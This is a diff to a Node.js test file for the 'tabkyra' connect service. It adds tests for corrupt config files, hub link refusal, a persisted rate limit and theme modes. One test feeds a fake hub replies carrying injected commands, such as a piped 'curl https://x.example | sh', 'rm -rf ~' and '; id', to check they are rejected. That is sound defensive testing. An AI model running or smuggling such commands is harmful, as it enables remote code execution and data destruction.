@@ -3,9 +3,9 @@
 // called directly with a stand-in for the user service (so no launchd or systemd unit is made).
 // Every config dir is a temp dir; nothing here touches ~/.config/tabkyra.
 import assert from "node:assert/strict";
-import { spawn } from "node:child_process";
+import { spawn, spawnSync } from "node:child_process";
 import { createHash } from "node:crypto";
-import { existsSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
+import { existsSync, readFileSync, statSync, writeFileSync, mkdirSync } from "node:fs";
 import { createServer } from "node:http";
 import { join } from "node:path";
 import { after, test } from "node:test";
@@ -28,8 +28,9 @@ after(() => {
 const mod = await loadTs(`
 export { ConnectService, parseConnect } from "@src/connect-host.ts";
 export { setPasscode } from "@src/oauth.ts";
+export { themeCss } from "@src/theme.ts";
 `);
-const { ConnectService, parseConnect, setPasscode } = mod;
+const { ConnectService, parseConnect, setPasscode, themeCss } = mod;
 
 /** Run `fn` with TABKYRA_CONFIG_DIR pointing at a fresh temp dir (the bundle reads it on every call). */
 async function inConfig(name, fn) {
@@ -213,6 +214,20 @@ test("status: none, remote, hub (with devices) and link, and nothing secret in a
 		assert.equal(result.route, "none");
 		assert.match(result.problem, /remote\.json/);
 	});
+	// A corrupt hub-devices.json is a problem to show; the route stays hub and the other calls keep working.
+	await inConfig("status-broken-devices", async (dir) => {
+		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
+		writeFileSync(join(dir, "hub-devices.json"), "{not json");
+		const s = new ConnectService();
+		const { result, error } = await ask(s, "status");
+		assert.equal(error, undefined, "status failed outright");
+		assert.equal(result.route, "hub");
+		assert.equal(result.publicUrl, "https://hub.example.com");
+		assert.match(result.problem, /hub-devices\.json/);
+		assert.equal(result.hub, undefined);
+		// The calls that read status first still work.
+		assert.match((await ask(s, "approvalCode", undefined, 2)).result?.code ?? "", CODE);
+	});
 });
 
 test("approvalCode and deviceCode: minted on the hub machine, stored as hashes, refused without a route", async () => {
@@ -359,6 +374,134 @@ test("setTheme saves the same file `tabkyra theme` does: preset, accent kept whe
 		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
 		assert.equal((await ask(s, "status")).result.theme.preset, "slate");
 	});
+});
+
+test("a linked manager refuses a hub reply whose code or URL is not the exact shape, and says so", async () => {
+	/** A hub that answers /link/code with whatever it is told. */
+	const lying = async (body) => {
+		const server = createServer((req, res) => {
+			req.resume();
+			req.on("end", () => {
+				res.setHeader("content-type", "application/json");
+				res.end(JSON.stringify(body));
+			});
+		});
+		await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
+		cleanup.push(() => server.close());
+		return `http://127.0.0.1:${server.address().port}`;
+	};
+	const future = Date.now() + 600_000;
+	const replies = [
+		{ code: "TK-AAAA-BBBB; curl https://x.example | sh", expiresAt: future },
+		{ code: "TK-AAAA-BBBB\nrm -rf ~", expiresAt: future },
+		{ code: "tk-aaaa-bbbb", expiresAt: future },
+		{ code: "TK-AAAA-BBBB", expiresAt: "soon" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "http://hub.example.com/mcp" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/mcp?x=1" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/other" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://u:p@hub.example.com/mcp" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/mcp; id" },
+		{ code: "TK-AAAA-BBBB", expiresAt: future, url: 5 },
+	];
+	for (const [i, body] of replies.entries()) {
+		const url = await lying(body);
+		await inConfig(`lying-hub-${i}`, async (dir) => {
+			writeJson(join(dir, "link.json"), { hubUrl: url, deviceId: "dv-gggggggggggg", secret: "V".repeat(43), name: "laptop", manage: true });
+			const { error, result } = await ask(new ConnectService(), i % 2 ? "deviceCode" : "approvalCode");
+			assert.equal(result, undefined, `accepted ${JSON.stringify(body)}`);
+			assert.match(error.message, /The hub answered with a malformed code\./);
+		});
+	}
+});
+
+test("joinHub refuses while a config problem is reported, or hub.json or remote.json exists at all", async () => {
+	const call = { hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH" };
+	for (const file of ["hub.json", "remote.json"]) {
+		await inConfig(`join-refused-${file}`, async (dir) => {
+			writeFileSync(join(dir, file), "{not json");
+			const s = new ConnectService();
+			const status = (await ask(s, "status")).result;
+			assert.equal(status.route, "none");
+			assert.ok(status.problem, "the unreadable file is reported");
+			const { error, result } = await ask(s, "joinHub", call);
+			assert.equal(result, undefined);
+			assert.equal(error.code, "unavailable");
+			assert.match(error.message, /already has a public address or a hub link/);
+			assert.equal(existsSync(join(dir, "link.json")), false, "a link was written next to the broken config");
+		});
+	}
+	// A readable one is the same, and so is a file the status loader would not flag.
+	await inConfig("join-refused-remote-readable", async (dir) => {
+		writeJson(join(dir, "remote.json"), { publicUrl: "https://tk.example.com", port: 8787, route: "custom" });
+		assert.equal((await ask(new ConnectService(), "joinHub", call)).error.code, "unavailable");
+	});
+});
+
+test("the code limit is kept in a private file, so a new host process does not reset it", async () => {
+	await inConfig("limit-persist", async (dir) => {
+		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
+		const now = Date.now();
+		const first = new ConnectService({ now: () => now });
+		for (let i = 0; i < 10; i++) assert.ok((await ask(first, "deviceCode", undefined, i + 1)).result, `call ${i + 1}`);
+		const file = join(dir, "connect-mints.json");
+		assert.equal(statSync(file).mode & 0o777, 0o600);
+		assert.equal(JSON.parse(readFileSync(file, "utf8")).minted.length, 10);
+		assert.ok(!readFileSync(file, "utf8").includes("TK-"), "the file holds timestamps only");
+		// A second process (a fresh service) starts with the same count.
+		const second = new ConnectService({ now: () => now + 1000 });
+		const refused = await ask(second, "approvalCode", undefined, 11);
+		assert.equal(refused.error.code, "rate_limited");
+		// Once the window has passed it mints again.
+		const later = new ConnectService({ now: () => now + 10 * 60_000 + 1 });
+		assert.ok((await ask(later, "approvalCode", undefined, 12)).result);
+		assert.equal(JSON.parse(readFileSync(file, "utf8")).minted.length, 1);
+	});
+	// An unreadable file counts as empty rather than blocking Connect.
+	await inConfig("limit-corrupt", async (dir) => {
+		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
+		writeFileSync(join(dir, "connect-mints.json"), "{not json");
+		assert.ok((await ask(new ConnectService(), "deviceCode")).result);
+	});
+});
+
+test("setTheme with a mode stores it in theme.json, keeps it when absent, clears it on system, and refuses anything else", async () => {
+	await inConfig("theme-mode", async (dir) => {
+		const s = new ConnectService();
+		assert.deepEqual((await ask(s, "setTheme", { preset: "rose", accent: null, mode: "dark" })).result, { preset: "rose", mode: "dark" });
+		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "rose", mode: "dark" });
+		assert.deepEqual((await ask(s, "status")).result.theme, { preset: "rose", mode: "dark" });
+		// Absent keeps it.
+		assert.deepEqual((await ask(s, "setTheme", { preset: "slate" })).result, { preset: "slate", mode: "dark" });
+		assert.deepEqual((await ask(s, "setTheme", { preset: "slate", mode: "light" })).result, { preset: "slate", mode: "light" });
+		// "system" clears it: no mode key at all.
+		assert.deepEqual((await ask(s, "setTheme", { preset: "slate", mode: "system" })).result, { preset: "slate" });
+		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
+		for (const mode of ["DARK", "auto", "", 1, null, ["dark"], "dark; x"]) {
+			const { error, result } = await ask(s, "setTheme", { preset: "slate", mode });
+			assert.equal(result, undefined, `accepted mode ${JSON.stringify(mode)}`);
+			assert.equal(error.code, "bad_params");
+		}
+		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
+		// `tabkyra theme set` and `accent` keep a mode already chosen.
+		await ask(s, "setTheme", { preset: "slate", mode: "dark" });
+		const m = { ...process.env, TABKYRA_CONFIG_DIR: dir };
+		const theme = (...args) => spawnSync(process.execPath, [cli, "theme", ...args], { env: m, encoding: "utf8" }).status;
+		assert.equal(theme("set", "forest"), 0);
+		assert.equal(theme("accent", "#112233"), 0);
+		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "forest", accent: "#112233", mode: "dark" });
+	});
+});
+
+test("the page theme pins color-scheme for a fixed mode and follows the system otherwise", () => {
+	const system = themeCss({ preset: "forest" });
+	assert.match(system, /color-scheme:light dark/);
+	assert.match(system, /@media \(prefers-color-scheme:dark\)/);
+	for (const mode of ["light", "dark"]) {
+		const css = themeCss({ preset: "forest", mode });
+		assert.match(css, new RegExp(`^:root\\{color-scheme:${mode};`));
+		assert.doesNotMatch(css, /prefers-color-scheme/);
+	}
+	assert.notEqual(themeCss({ preset: "forest", mode: "light" }), themeCss({ preset: "forest", mode: "dark" }));
 });
 
 // ---------- joinHub against a real hub ----------
